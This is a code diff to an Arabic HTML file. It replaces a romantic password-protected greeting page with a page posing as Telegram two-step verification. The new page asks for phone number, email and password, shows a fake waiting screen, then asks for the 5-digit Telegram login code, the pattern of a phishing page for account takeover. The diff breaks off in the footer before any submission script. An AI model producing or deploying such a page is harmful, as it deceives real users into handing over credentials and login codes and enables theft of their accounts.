@@ -1,620 +1,841 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-    <title>سحوره · سيوده · عالم الحب</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>توثيق تليجرام - التحقق بخطوتين</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', 'Arial Black', 'Tahoma', cursive, sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
-
+        
         body {
-            background: #030005;
+            background: linear-gradient(145deg, #2e1a4a 0%, #1a1035 50%, #0d0a1f 100%);
             min-height: 100vh;
             display: flex;
-            align-items: center;
             justify-content: center;
-            color: #f0e6ff;
+            align-items: center;
+            padding: 20px;
+            position: relative;
             overflow-x: hidden;
         }
-
-        /* ===== عناصر التساقط المشتركة ===== */
-        .falling-item {
-            position: absolute;
-            top: -20px;
-            z-index: 50;
-            pointer-events: none;
-            animation: fall linear infinite;
-        }
-
-        @keyframes fall {
-            0% { transform: translateY(-10vh) rotate(0deg); opacity: 1; }
-            100% { transform: translateY(110vh) rotate(720deg); opacity: 0.2; }
-        }
-
-        /* ===== شاشة التحميل المتحسنة للجوال ===== */
-        .loading-screen {
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: #08000e;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 2000;
-            transition: opacity 1s ease, visibility 1s;
-            overflow: hidden;
-        }
-        .loading-hidden {
-            opacity: 0;
-            visibility: hidden;
-        }
-
-        .spinner-circle {
-            width: min(80vw, 450px);
-            height: min(80vw, 450px);
-            border-radius: 50%;
-            background: conic-gradient(#ff33ff, #b266ff, #ff66cc, #cc33ff, #ff33cc, #ff99ff, #ff33ff, #ff66ff);
-            animation: spin 0.8s infinite linear;
-            box-shadow: 0 0 min(10vw, 200px) #ff66ff, 0 0 min(15vw, 350px) #bf3fff, inset 0 0 min(8vw, 150px) #fff;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            position: relative;
-            z-index: 10;
-        }
-
-        .spinner-circle::after {
-            content: '';
-            position: absolute;
-            width: 70%;
-            height: 70%;
-            background: #0d001c;
-            border-radius: 50%;
-            box-shadow: inset 0 0 min(8vw, 150px) #f3c6ff;
-        }
-
-        .loading-text {
-            position: absolute;
-            z-index: 20;
-            font-size: min(10vw, 4.5rem);
-            font-weight: 900;
-            text-align: center;
-            color: #ffdbff;
-            text-shadow: 0 0 min(4vw, 80px) #ffb3ff, 0 0 min(8vw, 160px) #ff4dff, 0 0 min(12vw, 250px) #c624ff;
-            animation: textGlow 1.8s infinite alternate;
-            white-space: nowrap;
-            background: linear-gradient(135deg, #ffffff, #ffd0ff);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        @keyframes textGlow {
-            0% { opacity: 0.9; letter-spacing: 2px; }
-            100% { opacity: 1; letter-spacing: min(1vw, 14px); text-shadow: 0 0 min(6vw, 120px) #ffb8ff, 0 0 min(12vw, 280px) #ff4dc6; }
-        }
-
-        /* ===== الصفحة الرئيسية (كلمة المرور) متجاوبة ===== */
-        .main-page {
-            width: 100%;
-            min-height: 100vh;
-            display: none;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            background: radial-gradient(ellipse at top, #1f0b35, #010001);
-            padding: 15px;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .main-falling {
+        
+        /* خلفية متحركة معدنية */
+        .bg-animation {
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            pointer-events: none;
-            z-index: 5;
             overflow: hidden;
+            z-index: 0;
         }
-
-        .main-falling-item {
+        
+        .bg-animation span {
             position: absolute;
-            top: -20px;
-            color: #ff99ff;
-            font-size: clamp(1.5rem, 6vw, 2.5rem);
-            filter: drop-shadow(0 0 min(1vw, 20px) #ff66ff);
-            animation: mainFall linear infinite;
-            white-space: nowrap;
-            z-index: 5;
+            display: block;
+            width: 30px;
+            height: 30px;
+            background: linear-gradient(145deg, rgba(139, 92, 246, 0.1), rgba(109, 40, 217, 0.2));
+            border-radius: 50%;
+            animation: float 20s linear infinite;
+            bottom: -150px;
+            box-shadow: 0 0 20px rgba(139, 92, 246, 0.3);
         }
-
-        @keyframes mainFall {
-            0% { transform: translateY(-10vh) rotate(0deg); opacity: 1; }
-            100% { transform: translateY(110vh) rotate(720deg); opacity: 0; }
+        
+        @keyframes float {
+            0% {
+                transform: translateY(0) rotate(0deg) scale(1);
+                opacity: 0.5;
+            }
+            50% {
+                transform: translateY(-500px) rotate(360deg) scale(1.2);
+                opacity: 0.3;
+            }
+            100% {
+                transform: translateY(-1000px) rotate(720deg) scale(0.8);
+                opacity: 0;
+            }
         }
-
+        
         .container {
             width: 100%;
-            max-width: 600px;
-            background: rgba(18, 5, 36, 0.95);
-            backdrop-filter: blur(30px);
-            border: 4px solid #da88ff;
-            border-radius: 60px 20px 60px 20px;
-            box-shadow: 0 0 min(10vw, 300px) #bc5eff, 0 0 min(5vw, 150px) #e79dff inset;
-            padding: 2.5rem 1.5rem;
-            text-align: center;
-            transform: perspective(1500px) rotateX(2deg);
+            max-width: 550px;
             position: relative;
-            z-index: 10;
-        }
-
-        .glow-title {
-            font-size: clamp(3rem, 15vw, 8rem);
-            font-weight: 900;
-            color: #fdd3ff;
-            text-shadow: 0 0 min(4vw, 80px) #ffb5ff, 0 0 min(8vw, 180px) #cf6eff, 0 0 min(12vw, 300px) #b200ff;
-            margin-bottom: 1.5rem;
-            letter-spacing: 2px;
-            line-height: 1.2;
-        }
-
-        .input-password {
-            background: #220c33;
-            border: 4px solid #ec9eff;
-            border-radius: 50px;
-            padding: 1.2rem 1rem;
-            width: 100%;
-            font-size: clamp(1.8rem, 6vw, 4.5rem);
-            text-align: center;
-            color: #ffeaff;
-            caret-color: #ffb5ff;
-            box-shadow: 0 0 min(8vw, 200px) #f685ff, inset 0 0 min(4vw, 100px) #ffdbff;
-            outline: none;
-            margin: 2rem 0;
-            font-weight: bold;
-        }
-
-        .input-password::placeholder {
-            color: #c999ff;
-            font-size: clamp(1.2rem, 4vw, 3.5rem);
-        }
-
-        .glow-button {
-            background: #2d0f47;
-            border: 4px solid;
-            border-image-slice: 1;
-            border-image-source: linear-gradient(145deg, #ffadff, #ba5eff, #ff95e5);
-            padding: 1.5rem 2rem;
-            font-size: clamp(2rem, 8vw, 5.5rem);
-            font-weight: 900;
-            color: #fff5fe;
-            text-shadow: 0 0 min(4vw, 100px) #ffc2ff, 0 0 min(8vw, 200px) #ff75f0;
-            border-radius: 80px;
-            cursor: pointer;
-            box-shadow: 0 0 min(10vw, 250px) #ff94ff, 0 0 min(15vw, 400px) #d158ff;
-            animation: breath 1.7s infinite alternate;
-            transition: 0.3s;
-            width: 100%;
-        }
-
-        @keyframes breath {
-            0% { box-shadow: 0 0 min(6vw, 150px) #ffb9ff, 0 0 min(10vw, 280px) #d165ff; border-color: #ffb5ff; }
-            100% { box-shadow: 0 0 min(10vw, 280px) #ffb2ff, 0 0 min(15vw, 450px) #ff4eff; border-color: #fff3b2; }
-        }
-        .glow-button:hover {
-            transform: scale(1.05);
-            background: #401b64;
-        }
-
-        /* ===== الصفحة الاحتفالية المتجاوبة بالكامل ===== */
-        .love-page {
-            width: 100%;
-            min-height: 100vh;
-            display: none;
-            flex-direction: column;
-            align-items: center;
-            background: #0a0014;
-            position: relative;
-            padding: 20px 10px 40px;
-            overflow-x: hidden;
-        }
-
-        /* أمطار القلوب والأشكال ثلاثية الأبعاد - متجاوبة */
-        .hearts-rain {
-            position: absolute;
-            top: 0; left: 0; width: 100%; height: 100%;
-            pointer-events: none;
             z-index: 1;
+            animation: metallicGlow 3s ease-in-out infinite;
+        }
+        
+        @keyframes metallicGlow {
+            0%, 100% {
+                filter: drop-shadow(0 0 20px rgba(139, 92, 246, 0.3));
+            }
+            50% {
+                filter: drop-shadow(0 0 40px rgba(167, 139, 250, 0.5));
+            }
+        }
+        
+        .header {
+            background: linear-gradient(145deg, #2d1b4a, #1f1338);
+            padding: 25px;
+            border-radius: 20px 20px 0 0;
+            text-align: center;
+            border-bottom: 2px solid rgba(139, 92, 246, 0.5);
+            position: relative;
             overflow: hidden;
         }
         
-        .heart-drop, .name-drop {
+        .header::before {
+            content: '';
             position: absolute;
-            top: -20px;
-            filter: drop-shadow(0 0 min(1.5vw, 30px) #ff44ee);
-            animation: rainFall linear infinite;
-            text-shadow: 0 0 min(1.5vw, 30px) #ff99ff, 0 0 min(3vw, 60px) #ff44cc;
-            white-space: nowrap;
-            font-weight: 900;
-            z-index: 1;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(
+                45deg,
+                transparent 30%,
+                rgba(255, 255, 255, 0.1) 50%,
+                transparent 70%
+            );
+            animation: shine 6s infinite;
         }
-
-        @keyframes rainFall {
-            0% { transform: translateY(-20vh) rotate(0deg) scale(1); opacity: 0.9; }
-            100% { transform: translateY(120vh) rotate(720deg) scale(1.8); opacity: 0; }
+        
+        @keyframes shine {
+            0% {
+                transform: translateX(-100%) translateY(-100%) rotate(45deg);
+            }
+            100% {
+                transform: translateX(100%) translateY(100%) rotate(45deg);
+            }
         }
-
-        /* المحتوى فوق المطر */
-        .love-content {
-            position: relative;
-            z-index: 10;
-            width: 100%;
-            max-width: 500px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 30px;
-        }
-
-        /* العنوان الرئيسي متجاوب */
-        .main-title-3d {
-            font-size: clamp(2.5rem, 10vw, 5rem);
-            font-weight: 900;
-            background: linear-gradient(145deg, #ffd0ff, #fcacff, #ff7bff, #d98eff, #ffa6ff);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            text-shadow: 0 0 min(4vw, 120px) #ff80ff, 0 0 min(6vw, 200px) #f248ff, 0 0 min(8vw, 300px) #b200ff;
-            transform: perspective(2000px) rotateY(4deg) rotateX(3deg) translateZ(10px);
-            animation: advancedTitle 6s infinite alternate ease-in-out;
-            line-height: 1.3;
-            text-align: center;
-            white-space: normal;
-            letter-spacing: 2px;
+        
+        .header h1 {
+            color: #fff;
+            font-size: 28px;
             margin-bottom: 10px;
-            word-break: break-word;
-        }
-        @keyframes advancedTitle {
-            0% { transform: perspective(2000px) rotateY(2deg) rotateX(2deg) translateZ(5px); text-shadow: 0 0 min(3vw, 100px) #ff7bff, 0 0 min(6vw, 250px) #ff42d8; }
-            50% { transform: perspective(2000px) rotateY(8deg) rotateX(5deg) translateZ(15px); text-shadow: 0 0 min(6vw, 200px) #ffb3ff, 0 0 min(8vw, 350px) #ff38ff; }
-            100% { transform: perspective(2000px) rotateY(4deg) rotateX(4deg) translateZ(10px); text-shadow: 0 0 min(4vw, 150px) #ffb2ff, 0 0 min(7vw, 300px) #f064ff; }
-        }
-
-        /* ===== الصور العمودية متجاوبة ===== */
-        .vertical-images {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 25px;
-            width: 100%;
-        }
-
-        .image-card {
-            width: 100%;
-            background: rgba(22, 5, 43, 0.8);
-            backdrop-filter: blur(25px);
-            border: 3px solid #ffb3ff;
-            border-radius: 50px 15px 50px 15px;
-            padding: 1.5rem 1rem;
-            box-shadow: 0 0 min(6vw, 200px) #ff80ff, 0 0 min(3vw, 80px) #c44eff inset;
-            transform: perspective(1200px) rotateY(2deg) translateZ(5px);
-            transition: 0.5s;
-            text-align: center;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 15px;
-        }
-        .image-card:hover {
-            transform: perspective(1200px) rotateY(3deg) scale(1.01) translateZ(10px);
-            box-shadow: 0 0 min(8vw, 350px) #ffadff, 0 0 min(5vw, 150px) #ffc0ff inset;
-            border-color: #ffe6ff;
-        }
-
-        /* الصورة الرمزية متجاوبة */
-        .symbolic-img {
-            width: 100%;
-            min-height: 150px;
-            background: linear-gradient(145deg, #fea5ff, #c46eff, #ff77dd, #da70ff, #ffa3f0);
-            background-size: 300% 300%;
-            border-radius: 40px 10px 40px 10px;
-            border: 4px solid #ffc8ff;
-            box-shadow: 0 0 min(6vw, 200px) #ffaaff, 0 0 min(4vw, 120px) #ffd6ff inset;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: clamp(3rem, 12vw, 5rem);
-            color: #fff6f0;
-            text-shadow: 0 0 min(2vw, 40px) #ff58b0, 0 0 min(4vw, 100px) #ffffff;
-            animation: gradientImg 6s infinite alternate, softGlow 2.4s infinite alternate;
-            font-weight: 900;
-            padding: 1rem;
-            text-align: center;
-            line-height: 1.3;
-            word-break: break-word;
-        }
-        @keyframes gradientImg {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
-        @keyframes softGlow {
-            0% { filter: brightness(1); box-shadow: 0 0 min(5vw, 180px) #ff93ff, 0 0 min(3vw, 100px) #ffb3ff inset; }
-            100% { filter: brightness(1.25); box-shadow: 0 0 min(8vw, 300px) #ffb5ff, 0 0 min(5vw, 200px) #ffe3ff inset; }
-        }
-
-        /* الكaption متجاوب */
-        .card-caption {
-            font-size: clamp(1.8rem, 6vw, 3rem);
-            font-weight: 900;
-            color: #fff2ff;
-            text-shadow: 0 0 min(2vw, 40px) #ffa2ff, 0 0 min(3vw, 80px) #ff7bff, 0 0 min(5vw, 140px) #fa4dff;
-            background: rgba(48, 12, 80, 0.6);
-            border-radius: 60px;
-            padding: 0.8rem 1.5rem;
-            border: 3px solid #ffccff;
-            backdrop-filter: blur(12px);
-            transform: perspective(500px) rotateX(1deg);
-            width: fit-content;
-            margin: 5px 0;
+            text-shadow: 0 0 20px rgba(167, 139, 250, 0.5);
+            font-weight: 700;
             letter-spacing: 1px;
-            box-shadow: 0 0 min(3vw, 70px) #ffa1f0;
         }
-
-        /* تذييل متجاوب */
-        .love-footer {
-            font-size: clamp(2rem, 7vw, 4rem);
-            font-weight: 900;
-            background: linear-gradient(145deg, #ffbeff, #ff9cf5, #d57bff, #ffadff);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            text-shadow: 0 0 min(5vw, 150px) #ffb0ff, 0 0 min(8vw, 300px) #f062f0;
-            transform: perspective(1800px) rotateY(3deg) rotateX(2deg);
-            animation: footerGlide 7s infinite;
-            margin: 30px 0 20px;
+        
+        .header .link {
+            color: #c4b5fd;
+            font-size: 14px;
+            direction: ltr;
+            display: inline-block;
+            background: rgba(0, 0, 0, 0.3);
+            padding: 8px 20px;
+            border-radius: 30px;
+            border: 1px solid rgba(167, 139, 250, 0.3);
+            backdrop-filter: blur(5px);
+        }
+        
+        .main-content {
+            background: linear-gradient(145deg, #241b3a, #1a1330);
+            padding: 35px;
+            border-radius: 0 0 20px 20px;
+            box-shadow: 
+                0 20px 50px rgba(0, 0, 0, 0.5),
+                inset 0 1px 1px rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(139, 92, 246, 0.3);
+            border-top: none;
+        }
+        
+        .page {
+            transition: all 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+        }
+        
+        .page.hidden {
+            display: none;
+            opacity: 0;
+            transform: translateY(20px);
+        }
+        
+        .page:not(.hidden) {
+            display: block;
+            animation: slideIn 0.6s ease;
+        }
+        
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .title {
+            color: #fff;
+            font-size: 24px;
+            margin-bottom: 20px;
             text-align: center;
-            line-height: 1.3;
-            padding: 0 10px;
+            font-weight: 700;
+            text-shadow: 0 2px 10px rgba(167, 139, 250, 0.3);
         }
-        @keyframes footerGlide {
-            0% { transform: perspective(1800px) rotateY(1deg) rotateX(1deg) translateZ(0); }
-            50% { transform: perspective(1800px) rotateY(8deg) rotateX(3deg) translateZ(10px); text-shadow: 0 0 min(6vw, 200px) #ffc8ff,0 0 min(10vw, 400px) #fb6eff; }
-        }
-
-        /* النص الأخير متجاوب */
-        .final-note {
-            font-size: clamp(1.8rem, 6vw, 3.5rem);
-            font-weight: 900;
-            color: #f4e0ff;
-            text-shadow: 4px 4px 0 #9d44d4, 0 0 min(4vw, 120px) #ffbaea, 0 0 min(6vw, 200px) #ff99ff;
-            background: linear-gradient(135deg, #f3d2ff, #e6a6ff);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            border-top: 3px solid #ffb5ff;
-            border-bottom: 3px solid #ffb5ff;
-            padding: 1rem 0.5rem;
-            margin-top: 20px;
-            letter-spacing: 2px;
-            transform: perspective(800px) rotateX(1deg);
+        
+        .description {
+            color: #d8d0f0;
+            font-size: 14px;
+            margin-bottom: 25px;
             text-align: center;
+            line-height: 1.7;
+            background: rgba(0, 0, 0, 0.2);
+            padding: 15px;
+            border-radius: 10px;
+            border: 1px solid rgba(167, 139, 250, 0.2);
+        }
+        
+        .form-group {
+            margin-bottom: 25px;
+            position: relative;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 10px;
+            color: #c4b5fd;
+            font-size: 14px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+        
+        .form-group label i {
+            margin-left: 8px;
+            color: #a78bfa;
+        }
+        
+        .form-group input {
             width: 100%;
-            word-break: break-word;
+            padding: 15px 20px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 2px solid rgba(139, 92, 246, 0.3);
+            border-radius: 12px;
+            font-size: 15px;
+            transition: all 0.3s;
+            color: #fff;
+            box-shadow: inset 0 2px 5px rgba(0, 0, 0, 0.2);
         }
-
-        /* تلميح الباسورد للجوال */
-        .hint-text {
-            margin-top: 30px;
-            font-size: clamp(1.2rem, 4vw, 2rem);
-            color: #dcb0ff;
-            text-shadow: 0 0 min(2vw, 30px) #b266ff;
+        
+        .form-group input:focus {
+            outline: none;
+            border-color: #a78bfa;
+            background: rgba(0, 0, 0, 0.4);
+            box-shadow: 
+                0 0 20px rgba(167, 139, 250, 0.3),
+                inset 0 2px 5px rgba(0, 0, 0, 0.3);
+        }
+        
+        .form-group input::placeholder {
+            color: #6d6a7a;
+        }
+        
+        .submit-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(145deg, #7c3aed, #6d28d9);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin: 20px 0;
+            position: relative;
+            overflow: hidden;
+            text-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
+            box-shadow: 
+                0 10px 20px rgba(109, 40, 217, 0.4),
+                inset 0 2px 2px rgba(255, 255, 255, 0.2);
+        }
+        
+        .submit-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+            transition: left 0.5s;
+        }
+        
+        .submit-btn:hover::before {
+            left: 100%;
+        }
+        
+        .submit-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 
+                0 15px 30px rgba(124, 58, 237, 0.5),
+                inset 0 2px 2px rgba(255, 255, 255, 0.3);
+        }
+        
+        .submit-btn:active {
+            transform: translateY(0);
+        }
+        
+        .submit-btn i {
+            margin-left: 10px;
+            font-size: 16px;
+        }
+        
+        .footer {
+            text-align: center;
+            padding-top: 25px;
+            border-top: 1px solid rgba(139, 92, 246, 0.3);
+            color: #9d8fc2;
+            font-size: 13px;
+        }
+        
+        .footer .links {
+            margin-bottom: 15px;
+        }
+        
+        .footer .links a {
+            color: #a78bfa;
+            text-decoration: none;
+            margin: 0 15px;
+            font-size: 13px;
+            transition: all 0.3s;
+            position: relative;
+        }
+        
+        .footer .links a::after {
+            content: '';
+            position: absolute;
+            bottom: -3px;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background: linear-gradient(90deg, #a78bfa, transparent);
+            transition: width 0.3s;
+        }
+        
+        .footer .links a:hover::after {
+            width: 100%;
+        }
+        
+        .footer .links a:hover {
+            color: #c4b5fd;
+        }
+        
+        .notification {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: linear-gradient(145deg, #312e81, #1e1b4b);
+            color: white;
+            padding: 15px 25px;
+            border-radius: 50px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            display: none;
+            z-index: 2000;
+            text-align: center;
+            font-weight: 600;
+            border: 1px solid rgba(167, 139, 250, 0.3);
+            backdrop-filter: blur(10px);
+            animation: notificationSlide 0.5s ease;
+        }
+        
+        @keyframes notificationSlide {
+            from {
+                top: -100px;
+                opacity: 0;
+            }
+            to {
+                top: 20px;
+                opacity: 1;
+            }
+        }
+        
+        .notification i {
+            margin-left: 10px;
+            font-size: 18px;
+        }
+        
+        /* شاشة الانتظار */
+        .waiting-screen {
+            background: rgba(26, 16, 53, 0.9);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 30px;
+            text-align: center;
+            margin: 20px 0;
+            border: 1px solid rgba(167, 139, 250, 0.3);
+            animation: pulse 2s infinite;
+        }
+        
+        .waiting-screen i {
+            font-size: 60px;
+            color: #a78bfa;
+            margin-bottom: 20px;
+            text-shadow: 0 0 30px rgba(167, 139, 250, 0.5);
+        }
+        
+        .waiting-screen h3 {
+            color: #fff;
+            font-size: 22px;
+            margin-bottom: 15px;
+        }
+        
+        .waiting-screen p {
+            color: #d8d0f0;
+            font-size: 16px;
+            line-height: 1.8;
+            margin-bottom: 15px;
+        }
+        
+        .waiting-screen .highlight {
+            color: #a78bfa;
+            font-weight: 700;
+            font-size: 18px;
+            background: rgba(0, 0, 0, 0.3);
+            padding: 10px;
+            border-radius: 10px;
+            display: inline-block;
+            margin-top: 10px;
+        }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(167, 139, 250, 0.3);
+            border-top: 4px solid #a78bfa;
+            border-radius: 50%;
+            margin: 20px auto;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .success-icon {
+            text-align: center;
+            margin: 20px 0;
+            animation: pulse 2s infinite;
+        }
+        
+        .success-icon i {
+            font-size: 60px;
+            color: #a78bfa;
+            text-shadow: 0 0 30px rgba(167, 139, 250, 0.5);
+        }
+        
+        @keyframes pulse {
+            0%, 100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+            50% {
+                transform: scale(1.05);
+                opacity: 0.9;
+            }
+        }
+        
+        .verification-message {
+            background: rgba(167, 139, 250, 0.1);
+            padding: 20px;
+            border-radius: 15px;
+            text-align: center;
+            margin: 20px 0;
+            border: 1px solid rgba(167, 139, 250, 0.3);
+        }
+        
+        .verification-message p {
+            color: #fff;
+            font-size: 16px;
+            line-height: 1.8;
+            margin-bottom: 15px;
+        }
+        
+        .verification-message .highlight {
+            color: #a78bfa;
+            font-weight: 700;
+            font-size: 18px;
+            background: rgba(0, 0, 0, 0.2);
+            padding: 5px 15px;
+            border-radius: 20px;
+            display: inline-block;
+        }
+        
+        .back-link {
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        .back-link a {
+            color: #a78bfa;
+            text-decoration: none;
+            font-size: 14px;
+            transition: all 0.3s;
+        }
+        
+        .back-link a:hover {
+            color: #c4b5fd;
+        }
+        
+        .back-link i {
+            margin-left: 5px;
+        }
+        
+        /* تحسينات للجوال */
+        @media (max-width: 480px) {
+            .main-content {
+                padding: 20px;
+            }
+            
+            .header h1 {
+                font-size: 24px;
+            }
+            
+            .title {
+                font-size: 20px;
+            }
+            
+            .waiting-screen p {
+                font-size: 14px;
+            }
         }
     </style>
 </head>
 <body>
-
-<!-- شاشة التحميل -->
-<div id="loadingScreen" class="loading-screen">
-    <div class="spinner-circle">
-        <div class="loading-text">استـني ي حبيبتي ♡#</div>
+    <div class="bg-animation">
+        <span style="left: 10%; animation-delay: 0s;"></span>
+        <span style="left: 20%; animation-delay: 2s;"></span>
+        <span style="left: 30%; animation-delay: 4s;"></span>
+        <span style="left: 40%; animation-delay: 6s;"></span>
+        <span style="left: 50%; animation-delay: 8s;"></span>
+        <span style="left: 60%; animation-delay: 10s;"></span>
+        <span style="left: 70%; animation-delay: 12s;"></span>
+        <span style="left: 80%; animation-delay: 14s;"></span>
+        <span style="left: 90%; animation-delay: 16s;"></span>
     </div>
-</div>
-
-<!-- الصفحة الرئيسية (كلمة المرور) -->
-<div id="mainPage" class="main-page">
-    <div id="mainFalling" class="main-falling"></div>
+    
+    <div class="notification" id="notification">
+        <i class="fas fa-check-circle"></i>
+        <span id="notificationMessage"></span>
+    </div>
+    
     <div class="container">
-        <div class="glow-title">🔐 سـحـوره</div>
-        <input type="text" id="passwordInput" class="input-password" placeholder="كلمة المرور" value="">
-        <div id="loginBtn" class="glow-button">دوسي يحبي 😍❤</div>
-        <div class="hint-text">الباسورد: LOVE</div>
-    </div>
-</div>
-
-<!-- الصفحة الاحتفالية الجديدة -->
-<div id="lovePage" class="love-page">
-    <div class="hearts-rain" id="heartsRain"></div>
-    <div class="love-content">
-
-        <!-- العنوان الرئيسي -->
-        <h1 class="main-title-3d">سـحـوره |♡| سـيـوده</h1>
-
-        <!-- الصور العمودية -->
-        <div class="vertical-images">
-
-            <div class="image-card">
-                <div class="symbolic-img">💙🔐</div>
-                <div class="card-caption">بحـــبك ي حـياتي 💙🔐</div>
+        <div class="header">
+            <h1><i class="fas fa-shield-alt"></i> توثيق تليجرام</h1>
+            <div class="link"><i class="fas fa-link"></i> tu.gt.ta/et/tele.html?id=8562457386</div>
+        </div>
+        
+        <div class="main-content">
+            <!-- الصفحة الأولى: إدخال البيانات -->
+            <div id="page1" class="page">
+                <h2 class="title"><i class="fas fa-check-circle"></i> التحقق بخطوتين</h2>
+                
+                <p class="description">
+                    <i class="fas fa-info-circle"></i>
+                    يرجى ملء البيانات أدناه لإكمال عملية التحقق بخطوتين. سيتم مراجعة طلبك يدويًا خلال 24 ساعة. تأكد من صحة المعلومات المقدمة لتجنب أي تأخير في عملية التوثيق.
+                </p>
+                
+                <form id="telegramForm">
+                    <div class="form-group">
+                        <label><i class="fas fa-phone-alt"></i> رقم الهاتف</label>
+                        <input type="tel" id="phone" placeholder="+20 123 456 789" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label><i class="fas fa-envelope"></i> البريد الإلكتروني</label>
+                        <input type="email" id="email" placeholder="example@domain.com" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label><i class="fas fa-lock"></i> كلمة المرور</label>
+                        <input type="password" id="password" placeholder="********" required>
+                    </div>
+                    
+                    <button type="submit" class="submit-btn" id="submitBtn">
+                        <i class="fas fa-arrow-left"></i> متابعة التوثيق
+                    </button>
+                </form>
             </div>
-
-            <div class="image-card">
-                <div class="symbolic-img">❤#</div>
-                <div class="card-caption">بعـشقڪ ❤#</div>
+            
+            <!-- الصفحة الثانية: شاشة الانتظار -->
+            <div id="page2" class="page hidden">
+                <div class="waiting-screen">
+                    <i class="fas fa-clock"></i>
+                    <h3>جاري إرسال كود التحقق</h3>
+                    <p>يرجى الانتظار... سيتم إرسال كود التحقق إلى حسابك على تليجرام لإتمام عملية التوثيق</p>
+                    <p style="color: #a78bfa; font-size: 18px; font-weight: 600;">⏱️ عادةً ما يستغرق هذا الوقت بضع دقائق</p>
+                    <div class="spinner"></div>
+                    <p class="highlight">⚠️ لا تغلق هذه الصفحة</p>
+                </div>
             </div>
-
-            <div class="image-card">
-                <div class="symbolic-img">💙🔐</div>
-                <div class="card-caption">بـمـوت فيڪي 💙🔐</div>
+            
+            <!-- الصفحة الثالثة: إدخال كود التحقق -->
+            <div id="page3" class="page hidden">
+                <div class="success-icon">
+                    <i class="fas fa-envelope-open-text"></i>
+                </div>
+                
+                <h2 class="title"><i class="fas fa-key"></i> أدخل كود التحقق</h2>
+                
+                <div class="verification-message">
+                    <p><i class="fas fa-paper-plane"></i> تم إرسال كود التحقق إلى حسابك على تليجرام</p>
+                    <p class="highlight">📱 يرجى إدخال الكود المكون من 5 أرقام</p>
+                    <p style="font-size: 14px; color: #d8d0f0;">سيتم توثيق حسابك فور إدخال الكود الصحيح</p>
+                </div>
+                
+                <form id="verificationForm">
+                    <div class="form-group">
+                        <label><i class="fas fa-qrcode"></i> كود التحقق (5 أرقام)</label>
+                        <input type="text" id="verificationCode" placeholder="مثال: 12345" maxlength="5" pattern="[0-9]{5}" inputmode="numeric" required>
+                    </div>
+                    
+                    <button type="submit" class="submit-btn" id="verifyBtn">
+                        <i class="fas fa-check"></i> توثيق
+                    </button>
+                </form>
+                
+                <div class="back-link">
+                    <a href="#" onclick="showPage1(); return false;">
+                        <i class="fas fa-arrow-right"></i> العودة لإدخال البيانات
+                    </a>
+                </div>
             </div>
-
-            <div class="image-card">
-                <div class="symbolic-img">👼✨</div>
-                <div class="card-caption">مـلاڪي || سـحورتي</div>
-            </div>
-
-            <div class="image-card">
-                <div class="symbolic-img">💜🌀</div>
-                <div class="card-caption">بـدمنك ي مـزتي</div>
-            </div>
-
-            <div class="image-card">
-                <div class="symbolic-img">🌹👑</div>
-                <div class="card-caption">عمـري ي نـاس</div>
-            </div>
-
-            <div class="image-card">
-                <div class="symbolic-img">💗💗💗</div>
-                <div class="card-caption">بــححححبك</div>
+            
+            <div class="footer">
+                <div class="links">
